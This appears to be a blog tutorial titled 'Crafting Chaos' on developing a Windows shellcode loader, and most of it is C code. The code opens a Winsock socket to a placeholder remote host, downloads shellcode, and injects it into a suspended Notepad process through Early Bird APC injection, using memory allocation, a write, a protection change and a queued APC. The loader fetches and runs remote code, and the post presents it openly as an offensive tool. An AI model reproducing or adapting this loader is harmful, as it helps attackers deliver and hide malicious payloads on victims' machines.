# :skull: Crafting Chaos A Deep Dive Into Developing Shellcode Loaders A965A80903F2

---

### Technical breakdown:

The loader uses “[Winsock2](https://learn.microsoft.com/en-us/windows/win32/winsock/windows-sockets-start-page-2)” library for implementing sockets. If you are not familiar with Winsock2 library then here’s Microsoft’s definition for you.

>

Windows Sockets 2 (Winsock) enables programmers to create advanced Internet, intranet, and other network-capable applications to transmit application data across the wire, independent of the network protocol being used.

We need to download our shellcode that we have created and to simplify the process we can break down the download process like this:

- Initializing Winsock

- Creating a socket

- Connecting to the server

- Receiving data

I won’t go in depth about what each of the arguments mean for each function since they’re are all readily available in the documentation.

### Initializing Winsock

We’ll use the WSAStartup() function to initialize Winsock:

```
WSADATA wsadata;
WSAStartup(MAKEWORD(2,2), &wsadata);
```

### Creating a Socket

The socket() function is used to create a socket. The sockaddr_in struct is used to define some required information such as the target IP address and port number:

```
SOCKET revshell = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
if (revshell == INVALID_SOCKET) {
printf("[!] Failed to create a socket.\nExiting with error: %ld\n", WSAGetLastError());
closesocket(revshell);
WSACleanup();
exit(1);
}
printf("[+] Socket created successfully.\n");

SOCKADDR_IN sockaddr = { 0 };
sockaddr.sin_family = AF_INET;
sockaddr.sin_port = htons(443); //Change the port number
inet_pton(AF_INET, "127.0.0.1", &sockaddr.sin_addr.s_addr); //Change the IP address
```

### Connecting to The Server

The connect() function is used to connect to the server:

```
if (connect(revshell, (SOCKADDR*)&sockaddr, sizeof(sockaddr)) == SOCKET_ERROR) {
printf("[!] Failed to connect to socket.\nExiting with error: %ld\n",WSAGetLastError());
closesocket(revshell);
WSACleanup();
exit(1);
}
printf("[+] Connected to socket!\n");
```

### Receiving Data

To receive that data we use the recv() function and store the response into the variable shellcode:

```
if (shellcodeDownload = recv(revshell, (char*)shellcode, 1024, 0) == SOCKET_ERROR) {
printf("[!] Error downloading the shellcode.\nExiting with error: %ld\n", WSAGetLastError());
}
printf("%s\n", shellcode);
printf("[+] Size of shellcode: %ld\n", sizeof(shellcode));

shellcode[shellcodeDownload];

closesocket(revshell);
```

### Process Injection

Now, We have the program which downloads the shellcode and stores it in a variable. Let’s proceed with the Early Bird APC Injection program. As I have already mentioned , for detailed explanation of this code checkout that blog post that I’ve linked above.

```
int main() {

printf("[*] Attempting to download shellcode.\n");
Sleep(400);
ReverseShell(); //Function to download the shellcode

STARTUPINFOA stinfo = { 0 };
PROCESS_INFORMATION pinfo = { 0 };

//Creating a sacrificial process where we will be injecting our shellcode
if (!CreateProcessA("C:\\Windows\\System32\\Notepad.exe", NULL, NULL, NULL, FALSE, (CREATE_SUSPENDED | CREATE_NO_WINDOW), NULL, NULL, &stinfo, &pinfo)) {
printf("[!] Failed to create a sacrificial process.\nExiting with error: %ld\n", GetLastError());
return EXIT_FAILURE;
}
printf("[+] Sacrificial process created successfully with PID: %ld\n",pinfo.dwProcessId);

HANDLE hProcess = pinfo.hProcess;
HANDLE hThread = pinfo.hThread;
DWORD oldprotect = 0;

//Allocating memory in the sacrificial process to store our shellcode.
LPVOID virtualmem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
if (virtualmem == NULL) {
printf("[!] Failed to allocate memory.\nExiting with error: %ld\n", GetLastError());
return EXIT_FAILURE;
}
printf("[+] Memory successfully allocated.\n\t\\----0x%p\n", virtualmem);

//Writing the downloaded shellcode into the allocated memory.
if (!WriteProcessMemory(hProcess, virtualmem, shellcode, sizeof(shellcode), NULL)) {
printf("[!] Failed to write shellcode into memory.\nExiting with error: %ld\n", GetLastError());
return EXIT_FAILURE;
}
printf("[+] Shellcode written into memory.\n\t\\----0x%p\n", shellcode);

//Changing the memory protection of the allocated memory region.
if (!VirtualProtectEx(hProcess, virtualmem, sizeof(shellcode), PAGE_EXECUTE_READ, &oldprotect)) {
printf("[!] Failed to change memory protection.\nExiting with error: %ld\n",GetLastError());
return EXIT_FAILURE;
}
printf("[+] Memory protection changed from PAGE_READWRITE to PAGE_EXECUTE_READ\n");

Sleep(400);

printf("[*] Attempting to execute shellcode.\n");

//Setting the main thread to Alert state to trigger APC Injection.
QueueUserAPC((PAPCFUNC)virtualmem, hThread, NULL);
ResumeThread(hThread);

printf("[+] Shellcode executed!\n");

//Closing the handle to the process and thread.
CloseHandle(hProcess);
CloseHandle(hThread);

return EXIT_SUCCESS;

}
```

---
